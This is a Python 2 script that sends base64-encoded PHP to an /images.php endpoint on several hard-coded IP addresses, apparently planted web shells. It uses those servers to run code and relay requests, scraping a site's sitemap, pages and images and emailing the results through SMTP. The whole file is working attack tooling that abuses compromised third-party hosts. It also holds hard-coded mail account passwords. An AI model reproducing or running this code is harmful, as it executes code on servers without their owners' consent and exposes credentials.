import httplib
from xml.dom.minidom import parse
import xml.dom.minidom
import time
import re
import smtplib
from email.mime.text import MIMEText
from email.header import Header

proxy_ip = "198.48.181.195"
proxy_ip = "197.44.62.106"
proxy_ip = "103.115.42.179"

proxy_port = "80"
rq = "echo file_get_contents('{}');"


def mlog(s):
    t = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    f = "-----------------\n{}\n{}\n\n".format(t,s)
    flog = open("ffgong.log","a+")
    flog.write(f)
    flog.close()
    

def getRsp(url):
    headers = {"Content-Type":" application/x-www-form-urlencoded"}
    u = rq.format(url).encode("base64")
    data = "a=34926&code={}".format(u)
    conn = httplib.HTTPConnection(proxy_ip,proxy_port,timeout=20)
    #conn.sock.settimeout(2000)
    conn.request(method="POST",url="/images.php",headers=headers,body=data)
    r = conn.getresponse()
    d = r.read()
    
    
    return d

def xml2dict(b):
    re = []
    DOMTree = xml.dom.minidom.parseString(b)
    dom_urls = DOMTree.getElementsByTagName("url")
    for dom_url in dom_urls:
        u = dom_url.getElementsByTagName("loc")[0]
        pu = u.childNodes[0].data
        re.append(pu)
    return re

def task_one():
    mlog("TASK START!")
    print "TASK START!"
    new_list = []
    url_list = []
    try:
        url_list= xml2dict(getRsp("http://www.fangongheike.com/sitemap.xml?page=1"))
    except:
        mlog("xml2dict Faile!")
        
    f = open("urls.hack.txt","r")
    us = []
    for line in f.readlines():
        us.append(line.strip())
    f.close()
    for url in url_list:
        if url not in us:
            new_list.append(url)
    t = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    
    if len(new_list) > 0:
        
        if send_message(new_list) == True:
            f = open("urls.hack.txt","w")
            f.write(t + "\n")
            for i in url_list:
                f.write(i + "\n")
            f.close()
            print "send OK!"
            
            
        else:
            print "send False!"
            mlog("TASK False!")
            return False
    else:
        print "no update!"
    mlog("TASK ok!")
    return True
        
    
    
    
    
def send_message(nlist):
    if False:
        return True
    
    for u in nlist:
        d = getRsp(u)
        
        if sendmail(getContent(d)) ==True:
            continue
        else:
            return False
    return True

def getContent(data):
    #print data
    rer = "<meta content='.*' property='og\:"
    ro = re.compile(rer,re.I|re.M)
    s = ro.findall(data)
    #print s
    content = ""
    filename = str(time.time())+".jpg"
    
    t = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    for i in range(0,4):
        s[i]=s[i].replace("<meta content='","").replace("' property='og:","")
    try:
        fimg = open('/var/www/fghhhk/'+filename,"w")
        fimg.write(getRsp(s[3]))
        fimg.close()
        mlog("img sava success:"+filename)
    except:
        print "img sava fail!"
        mlog("img sava fail!")
        filename += " [ error file save!] "
    content = "\n{}\n{}\n{}\n{}src='{}'\nimg src='http://106.12.217.32/fghhhk/{}'".format(t,s[1],s[0],s[2],s[3],filename)
    return content
    
def sendmail(content):
    
    #receivers = ["673588037@qq.com","imfucihua@qq.com"]
    receivers = ["imfucihua@qq.com"]    
    mail_host="smtp.163.com" 
    mail_host = "smtp.tom.com"
    mail_user="chglory@163.com"   
    mail_user = "zhangsan855@tom.com"
    mail_pass="zhangsan@2019" 
    mail_pass = "admin123"
    sender = mail_user
    message = MIMEText(content, 'plain')
    message['From'] = Header(mail_user)
    huserto = ""
    for i in receivers:
        huserto += huserto +"," +i
    huserto = huserto[1:]
    message['To'] =  Header(huserto)    
    subject = 'Fang Hack!'
    message['Subject'] = Header(subject)   
    try:
        smtpObj = smtplib.SMTP() 
        smtpObj.connect(mail_host, 25)    
        smtpObj.login(mail_user,mail_pass)  
        smtpObj.sendmail(sender, receivers, message.as_string())
        print "send success"
        mlog("send success:"+content)
    except smtplib.SMTPException:
        print "Error: err" 
        mlog("send faile!:"+content)
        return False
    return True
    
    
def run_task():
    while True:
        
        try:
            if not task_one():
                print "wait 40s.."
                time.sleep(40)
                continue
            print "ok--wait 600s.."
            time.sleep(600)
        except:
            print time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            print "error"
            print "wait 30s.."
            time.sleep(30)
            

    
if __name__ == "__main__":
    run_task()
    #sendmail("test2")


    
    
    
    
    
